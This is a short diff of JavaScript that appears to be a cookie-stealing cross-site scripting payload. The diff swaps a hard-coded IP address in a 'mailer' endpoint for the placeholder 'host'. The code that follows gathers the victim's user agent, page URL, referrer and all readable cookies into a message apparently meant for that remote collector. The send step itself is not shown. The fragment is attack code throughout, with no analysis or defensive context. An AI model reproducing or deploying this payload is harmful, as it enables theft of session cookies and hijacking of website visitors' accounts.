@@ -1,4 +1,4 @@
-var mailer = '//31.44.88.173/x/';
+var mailer = '//host/x/';
 
 var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
 msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' + document.cookie;
